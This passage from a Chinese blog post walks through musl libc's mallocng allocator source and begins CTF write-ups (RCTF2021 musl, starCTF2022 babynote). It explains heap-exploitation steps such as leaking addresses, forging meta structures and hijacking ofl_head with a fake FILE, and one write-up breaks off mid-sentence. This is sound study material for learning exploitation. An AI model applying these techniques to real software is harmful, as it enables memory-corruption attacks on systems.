class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> *<span class="title function_">enframe</span><span class="params">(<span class="keyword">struct</span> meta *g, <span class="type">int</span> idx, <span class="type">size_t</span> n, <span class="type">int</span> ctr)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">size_t</span> stride = get_stride(g);<span class="comment">//get_stride用于计算这个meta中存储的chunk大小</span></span><br><span class="line"><span class="type">size_t</span> slack = (stride-IB-n)/UNIT;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *p = g-&gt;mem-&gt;storage + stride*idx;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *end = p+stride-IB;<span class="comment">//这一段用于计算chunk的起始和结束地址</span></span><br><span class="line"><span class="comment">// cycle offset within slot to increase interval to address</span></span><br><span class="line"><span class="comment">// reuse, facilitate trapping double-free.</span></span><br><span class="line"><span class="type">int</span> off = (p[<span class="number">-3</span>] ? *(<span class="type">uint16_t</span> *)(p<span class="number">-2</span>) + <span class="number">1</span> : ctr) &amp; <span class="number">255</span>;</span><br><span class="line">assert(!p[<span class="number">-4</span>]);</span><br><span class="line"><span class="keyword">if</span> (off &gt; slack) &#123;</span><br><span class="line"><span class="type">size_t</span> m = slack;</span><br><span class="line">m |= m&gt;&gt;<span class="number">1</span>; m |= m&gt;&gt;<span class="number">2</span>; m |= m&gt;&gt;<span class="number">4</span>;</span><br><span class="line">off &amp;= m;</span><br><span class="line"><span class="keyword">if</span> (off &gt; slack) off -= slack+<span class="number">1</span>;</span><br><span class="line">assert(off &lt;= slack);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (off) &#123;</span><br><span class="line"><span class="comment">// store offset in unused header at offset zero</span></span><br><span class="line"><span class="comment">// if enframing at non-zero offset.</span></span><br><span class="line">*(<span class="type">uint16_t</span> *)(p<span class="number">-2</span>) = off;</span><br><span class="line">p[<span class="number">-3</span>] = <span class="number">7</span>&lt;&lt;<span class="number">5</span>;</span><br><span class="line">p += UNIT*off;</span><br><span class="line"><span class="comment">// for nonzero offset there is no permanent check</span></span><br><span class="line"><span class="comment">// byte, so make one.</span></span><br><span class="line">p[<span class="number">-4</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">*(<span class="type">uint16_t</span> *)(p<span class="number">-2</span>) = (<span class="type">size_t</span>)(p-g-&gt;mem-&gt;storage)/UNIT;</span><br><span class="line">p[<span class="number">-3</span>] = idx;</span><br><span class="line">set_size(p, end, n);</span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在前面对于meta的操作中，出现了queue和dequeue操作，也就是实现meta的插入和取出操作。</p><p>queue函数如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">queue</span><span class="params">(<span class="keyword">struct</span> meta **phead, <span class="keyword">struct</span> meta *m)</span> &#123;</span><br><span class="line">    assert(!m-&gt;next);</span><br><span class="line">    assert(!m-&gt;prev);</span><br><span class="line">    <span class="keyword">if</span> (*phead) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">head</span> =</span> *phead;</span><br><span class="line">        m-&gt;next = head;</span><br><span class="line">        m-&gt;prev = head-&gt;prev;</span><br><span class="line">        m-&gt;next-&gt;prev = m-&gt;prev-&gt;next = m;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        m-&gt;prev = m-&gt;next = m;</span><br><span class="line">        *phead = m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>实际上就是双向链表的插入过程</p><p>dequeue函数如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">dequeue</span><span class="params">(<span class="keyword">struct</span> meta **phead, <span class="keyword">struct</span> meta *m)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">        m-&gt;prev-&gt;next = m-&gt;next;</span><br><span class="line">        m-&gt;next-&gt;prev = m-&gt;prev;</span><br><span class="line">        <span class="keyword">if</span> (*phead == m) *phead = m-&gt;next;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        *phead = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    m-&gt;prev = m-&gt;next = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>双向链表的解链过程。解链过程中并没有检查指针合法性，因此存在被利用的风险。</p><p>malloc的流程如下</p><blockquote><p><strong>一、</strong>判断是否超过size 阈值</p><ul><li>先检查 申请的chunk的 needed size 是否超过最大申请限制</li><li>检查申请的needed 是否超过需要mmap 的分配的阈值 超过就用mmap 分配一个group 来给chunk使用</li><li>若是mmap 则设置各种标记</li></ul><p><strong>二、</strong>分配chunk</p><ol><li>若申请的chunk 没超过阈值 就从active 队列找管理对应size大小的meta</li><li>关于找对应size的meta 这里有两种情况:</li></ol><ul><li><p>如果active 对应size的meta 位置上为空，没找到那么尝试先找size更大的meta</p></li><li><p>如果active 对应size的meta位置上有对应的meta，尝试从这个meta中的group找到可用的chunk(这里malloc 那个循环:<code>for (;;)</code>，</p><p>这里不清楚建议看malloc源码分析那里)</p><ul><li><p>如果通过循环里，通过meta-&gt;avail_mask 判断当前group 中是否有空闲chunk</p><ul><li>有，就直接修改meta-&gt;avail_mask，然后利用enframe(g, idx, n, ctr);&#x2F;&#x2F; 从对应meta 中的group 取出 第idx号chunk分配</li><li>无，break 跳出循环</li></ul></li><li><p>跳出循环后执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">idx = alloc_slot(sc, n);alloc_slot</span><br></pre></td></tr></table></figure><p>有三种分配方式</p><ul><li><strong>使用group中被free的chunk</strong></li><li><strong>从队列中其他meta的group 中找</strong></li><li>如果都不行就重新分配一个新的group 对应一个新的meta</li></ul></li></ul></li></ul></blockquote><h4 id="2-2-2-free"><a href="#2-2-2-free" class="headerlink" title="2.2.2 free"></a>2.2.2 free</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> meta *<span class="title function_">get_meta</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">    assert(!((<span class="type">uintptr_t</span>)p &amp; <span class="number">15</span>));</span><br><span class="line">    <span class="type">int</span> offset = *(<span class="type">const</span> <span class="type">uint16_t</span> *)(p - <span class="number">2</span>);<span class="comment">// 得到chunk offset</span></span><br><span class="line">    <span class="type">int</span> index = p[<span class="number">-3</span>] &amp; <span class="number">31</span>;;<span class="comment">// 得到chunk idx</span></span><br><span class="line">    <span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">        assert(!offset);</span><br><span class="line">        offset = *(<span class="type">uint32_t</span> *)(p - <span class="number">8</span>);</span><br><span class="line">        assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="type">const</span> <span class="type">void</span> *)(p - UNIT*offset - UNIT);<span class="comment">// 通过offset 和chunk 地址计算出group地址</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span> =</span> base-&gt;meta;<span class="comment">// 从group 得到 meta 地址</span></span><br><span class="line">    assert(meta-&gt;mem == base);<span class="comment">// 检查meta 是否指向对应的group</span></span><br><span class="line">    assert(index &lt;= meta-&gt;last_idx);<span class="comment">// 检查chunk idx 是否超过 meta 最大chunk 容量</span></span><br><span class="line">    assert(!(meta-&gt;avail_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">    assert(!(meta-&gt;freed_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">area</span> =</span> (<span class="type">void</span> *)((<span class="type">uintptr_t</span>)meta &amp; <span class="number">-4096</span>);<span class="comment">// 得到meta_area 地址</span></span><br><span class="line">    assert(area-&gt;check == ctx.secret);<span class="comment">// 检查 check 校验值</span></span><br><span class="line">    <span class="keyword">if</span> (meta-&gt;sizeclass &lt; <span class="number">48</span>) &#123; <span class="comment">// 如果属于 sizeclasses 管理的chunk 大小</span></span><br><span class="line">        assert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);</span><br><span class="line">        assert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+<span class="number">1</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        assert(meta-&gt;sizeclass == <span class="number">63</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (meta-&gt;maplen) &#123;</span><br><span class="line">        assert(offset &lt;= meta-&gt;maplen*<span class="number">4096UL</span>/UNIT - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">struct</span> meta *)meta;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">free</span><span class="params">(<span class="type">void</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> get_meta(p);<span class="comment">//获取chunk所属的meta</span></span><br><span class="line"><span class="type">int</span> idx = get_slot_index(p);<span class="comment">//取得chunk idx</span></span><br><span class="line"><span class="type">size_t</span> stride = get_stride(g);<span class="comment">//得到当前meta的chunk大小</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *start = g-&gt;mem-&gt;storage + stride*idx;<span class="comment">//得到chunk的起始地址</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *end = start + stride - IB;<span class="comment">//得到结束地址</span></span><br><span class="line">get_nominal_size(p, end);</span><br><span class="line"><span class="type">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;idx, all = (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span>;</span><br><span class="line">((<span class="type">unsigned</span> <span class="type">char</span> *)p)[<span class="number">-3</span>] = <span class="number">255</span>;<span class="comment">//将chunk的idx赋值为0xff</span></span><br><span class="line"><span class="comment">// invalidate offset to group header, and cycle offset of</span></span><br><span class="line"><span class="comment">// used region within slot if current offset is zero.</span></span><br><span class="line">*(<span class="type">uint16_t</span> *)((<span class="type">char</span> *)p<span class="number">-2</span>) = <span class="number">0</span>;<span class="comment">//将offset设置为0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// release any whole pages contained in the slot to be freed</span></span><br><span class="line"><span class="comment">// unless it&#x27;s a single-slot group that will be unmapped.</span></span><br><span class="line">    <span class="comment">//如果释放的 chunk 的起始和结束地址差至少 2 个内存页则释放的 chunk 必然包含一个内存页，因此将 chunk 包含的所有完整物理页调用 madvise 设置 lazyfree 标志，这样在内存紧缺的时候会回收这些物理页。</span></span><br><span class="line"><span class="keyword">if</span> (((<span class="type">uintptr_t</span>)(start<span class="number">-1</span>) ^ (<span class="type">uintptr_t</span>)end) &gt;= <span class="number">2</span>*PGSZ &amp;&amp; g-&gt;last_idx) &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *base = start + (-(<span class="type">uintptr_t</span>)start &amp; (PGSZ<span class="number">-1</span>));</span><br><span class="line"><span class="type">size_t</span> len = (end-base) &amp; -PGSZ;</span><br><span class="line"><span class="keyword">if</span> (len) madvise(base, len, MADV_FREE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// atomic free without locking if this is neither first or last slot</span></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="type">uint32_t</span> freed = g-&gt;freed_mask;<span class="comment">//取得freed_mask，空闲chunk位图</span></span><br><span class="line"><span class="type">uint32_t</span> avail = g-&gt;avail_mask;<span class="comment">//取得avail_mask，可用chunk的位图</span></span><br><span class="line"><span class="type">uint32_t</span> mask = freed | avail;</span><br><span class="line">assert(!(mask&amp;self));</span><br><span class="line"><span class="keyword">if</span> (!freed || mask+self==all) <span class="keyword">break</span>;<span class="comment">//如果加上将要释放的 chunk 该 group 中的所有 chunk 要么被释放要么空闲则跳出循环</span></span><br><span class="line"><span class="keyword">if</span> (!MT)</span><br><span class="line">g-&gt;freed_mask = freed+self;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;freed_mask, freed, freed+self)!=freed)<span class="comment">//更新freed_mask</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wrlock();</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx);<span class="comment">//调用nontrivial_free释放 group</span></span><br><span class="line">unlock();</span><br><span class="line"><span class="keyword">if</span> (mi.len) munmap(mi.base, mi.len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>nontrivial_free函数如下，这个函数需要非常注意，因为其中调用了dequeue函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">nontrivial_free</span><span class="params">(<span class="keyword">struct</span> meta *g, <span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line"><span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line"><span class="type">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line"><span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line"><span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line"><span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">assert(sc &lt; <span class="number">48</span>);</span><br><span class="line"><span class="type">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">dequeue(&amp;ctx.active[sc], g);</span><br><span class="line"><span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">activate_group(ctx.active[sc]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> free_group(g);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">assert(sc &lt; <span class="number">48</span>);</span><br><span class="line"><span class="comment">// might still be active if there were no allocations</span></span><br><span class="line"><span class="comment">// after last available slot was taken.</span></span><br><span class="line"><span class="keyword">if</span> (ctx.active[sc] != g) &#123;</span><br><span class="line"><span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">a_or(&amp;g-&gt;freed_mask, self);</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">struct</span> mapinfo)&#123; <span class="number">0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用dequeue函数的条件是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line"><span class="type">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;<span class="comment">//meta中处于free和可使用状态的chunk集合</span></span><br><span class="line">mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)<span class="comment">//mask加上当前chunk使meta中的所有chunk要么处于空闲要么处于free状态，且满足okay_to_free</span></span><br><span class="line">    </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> okay_to_free(<span class="keyword">struct</span> meta *g)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!g-&gt;freeable) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//meta的freeable要为1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// always free individual mmaps not suitable for reuse</span></span><br><span class="line"><span class="keyword">if</span> (sc &gt;= <span class="number">48</span> || get_stride(g) &lt; UNIT*size_classes[sc])<span class="comment">//确保 meta-&gt;sizeclass &lt; 48 </span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// always free groups allocated inside another group&#x27;s slot</span></span><br><span class="line"><span class="comment">// since recreating them should not be expensive and they</span></span><br><span class="line"><span class="comment">// might be blocking freeing of a much larger group.</span></span><br><span class="line"><span class="keyword">if</span> (!g-&gt;maplen) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// if there is another non-full group, free this one to</span></span><br><span class="line"><span class="comment">// consolidate future allocations, reduce fragmentation.</span></span><br><span class="line"><span class="keyword">if</span> (g-&gt;next != g) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// free any group in a size class that&#x27;s not bouncing</span></span><br><span class="line"><span class="keyword">if</span> (!is_bouncing(sc)) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> cnt = g-&gt;last_idx+<span class="number">1</span>;</span><br><span class="line"><span class="type">size_t</span> usage = ctx.usage_by_class[sc];</span><br><span class="line"></span><br><span class="line"><span class="comment">// if usage is high enough that a larger count should be</span></span><br><span class="line"><span class="comment">// used, free the low-count group so a new one will be made.</span></span><br><span class="line"><span class="keyword">if</span> (<span class="number">9</span>*cnt &lt;= usage &amp;&amp; cnt &lt; <span class="number">20</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// otherwise, keep the last group in a bouncing class.</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有如下几种情况可以触发dequeue</p><p>1.当meta中只有1个chunk被使用，然后free掉这个chunk，就会触发dequeue，比如ptr&#x3D;malloc(0x20),free(ptr)就会导致meta被dequeue</p><p>2.当meta中的所有chunk都被使用了，且还剩最后一个chunk没有被free，此时释放最后一个chunk也会触发dequeue</p><p>3.avail_mask &#x3D; 0, freed_mask &#x3D; 0，且继续申请该大小的chunk，这时就会unlink此meta，使用新的meta分配。</p><h3 id="2-3-漏洞利用"><a href="#2-3-漏洞利用" class="headerlink" title="2.3 漏洞利用"></a>2.3 漏洞利用</h3><h4 id="2-3-1-RCTF2021-musl"><a href="#2-3-1-RCTF2021-musl" class="headerlink" title="2.3.1 RCTF2021 musl"></a>2.3.1 RCTF2021 musl</h4><p><img src="https://pic.imgdb.cn/item/65431862c458853aef9858c0.jpg"></p><p>程序开启了沙箱，不允许getshell</p><p><img src="https://pic.imgdb.cn/item/6543187fc458853aef98a148.jpg"></p><p>保护全开</p><p><img src="https://pic.imgdb.cn/item/654318bcc458853aef9928c8.jpg"></p><p>add，dele，show三个功能</p><p>看到add功能</p><p><img src="https://pic.imgdb.cn/item/654319dec458853aef9bc38f.jpg"></p><p>读取的size是int类型，但readn函数的第二个参数是unsigned int</p><p><img src="https://pic.imgdb.cn/item/65431a20c458853aef9c614d.jpg"></p><p><img src="https://pic.imgdb.cn/item/65431aa8c458853aef9da0ab.jpg"></p><p>当输入的size为0时，就会导致整数溢出。</p><p><img src="https://pic.imgdb.cn/item/65431af6c458853aef9e5bc0.jpg"></p><p>delete函数很安全</p><p><img src="https://pic.imgdb.cn/item/65431b1bc458853aef9eb2b7.jpg"></p><p>show函数根据index输出内容。</p><p>首先，在musl中我们无法像在ptmalloc中，立刻使用刚刚free掉的chunk，musl中malloc会优先分配处于avail状态的chunk，只有当meta中没有avail的chunk时，才会尝试从free状态的chunk取出chunk。</p><p>因此，如果要使用add功能的溢出漏洞来修改下一个chunk，就需要先把当前meta的chunk全部用掉。</p><p><img src="https://pic.imgdb.cn/item/6544fad2c458853aefd45a18.jpg"></p><p>在add功能中，除了用户申请的chunk，还会额外申请一个0xc的chunk，我们看看这个0xc的chunk有多少个</p><p><a href="https://imgse.com/i/piMcSfJ"><img src="https://z1.ax1x.com/2023/11/03/piMcSfJ.png" alt="piMcSfJ.png"></a></p><p>在这个meta中一共可以分配30个chunk，程序最多允许我们分配16次，所以如果要将这个meta中的chunk分配完，就需要将用户size也控制为0x10以内，如此就可以在一次add中申请两个0x10的chunk，15次add就能够将avail chunk清空。</p><p>如下图所示</p><p><a href="https://imgse.com/i/piMcM6I"><img src="https://z1.ax1x.com/2023/11/03/piMcM6I.png" alt="piMcM6I.png"></a></p><p>所有chunk都处于使用状态</p><p>然后我们将chunk0 free掉，再申请一块相同大小的chunk，由于此时0x10的meta中已无avail状态的chunk，就会从freed状态的chunk中取出，这样就可以取出刚刚free的chunk0，然后就可以进行堆溢出了。</p><p><a href="https://imgse.com/i/piMcwXq"><img src="https://z1.ax1x.com/2023/11/03/piMcwXq.png" alt="piMcwXq.png"></a></p><p>堆溢出可以直接将数据和下一个chunk-&gt;content指针拼接起来，然后show(0)就可以得到堆地址，得到堆地址之后，经过寻找，发现了这样的数据</p><p><a href="https://imgse.com/i/piMcch4"><img src="https://z1.ax1x.com/2023/11/03/piMcch4.png" alt="piMcch4.png"></a></p><p>进而可以泄露出libc地址。</p><p>得到libc地址之后就可以进而泄露出malloc_context中的secret字段，用于后续伪造meta。</p><p>在musl1.1.24的利用中就提到过，musl中不存在malloc_hook或者free_hook，只能想办法劫持IO_FILE。</p><p>劫持IO_FILE要么直接修改现有的FILE结构体，要么就自己伪造一个FILE结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/stdio/__stdio_exit.c:16</span></span><br><span class="line"><span class="type">void</span> __stdio_exit(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    FILE *f;</span><br><span class="line">    <span class="keyword">for</span> (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f);  &lt;----------</span><br><span class="line">    close_file(__stdin_used);</span><br><span class="line">    close_file(__stdout_used);</span><br><span class="line">    close_file(__stderr_used);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在exit时会检查<code>ofl_head</code>是否不为NULL，然后跟着<code>ofl_head</code>遍历整个链表，调用<code>close_file</code>关闭每个FILE结构体，所以我们可以伪造FILE结构体之后然后将<code>ofl_head</code>的值修改为fake_FILE的地址。</p><p>这里将使用free过程中的dequeue的指针互写，将<code>ofl_head</code></p><h4 id="2-3-2-starCTF2022-babynote"><a href="#2-3-2-starCTF2022-babynote" class="headerlink" title="2.3.2 starCTF2022 babynote"></a>2.3.2 starCTF2022 babynote</h4><p><img src="https://pic.imgdb.cn/item/65420bebc458853aef01c27d.jpg"></p><p>菜单堆题</p><p>add功能实现如下</p><p><img src="https://pic.imgdb.cn/item/654214acc458853aef18fe21.jpg"></p><p>0x4010中会存储当前node的地址，实际上实现了一个单向链表，采用头插法。</p><p>如下图所示，申请1个chunk</p><p><img src="https://pic.imgdb.cn/item/65421626c458853aef1cb62c.jpg"></p><p><img src="https://pic.imgdb.cn/item/654216a1c458853aef1ddb79.jpg"></p><p>由于最开始0x4010为0，所以prev字段为空</p><p>再申请第二个chunk</p><p><img src="https://pic.imgdb.cn/item/65421717c458853aef1eddae.jpg"></p><p>0x4010的值发生了变化</p><p><img src="https://pic.imgdb.cn/item/654217abc458853aef2031a0.jpg"></p><p>prev字段指向了第一个chunk的地址。</p><p>再看到find功能</p><p><img src="https://pic.imgdb.cn/item/65421885c458853aef224ba6.jpg"></p><p>输入name，然后通过prev字段进行遍历，如果找到对应的node，就输出其content。</p><p>再看到delete功能</p><p><img src="https://pic.imgdb.cn/item/65421998c458853aef24e42a.jpg"></p><p>也是通过namez找到对应的node，然后如果这个node不是nodehead或者最后一个node，就将其从单链表中删除，然后再把对应的chunk全部free；然而如果这个node是nodehead或者是最后一个node，就不会从单链表中删除，但依然会free掉对应的chunk，因此在这里存在uaf。</p><p>看到forget功能</p><p><img src="https://pic.imgdb.cn/item/65421a9ac458853aef273e9f.jpg"></p><p>将head node清空。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;早就该学musl pwn，之前学了一点又没学了，还是得学的&lt;/p&gt;
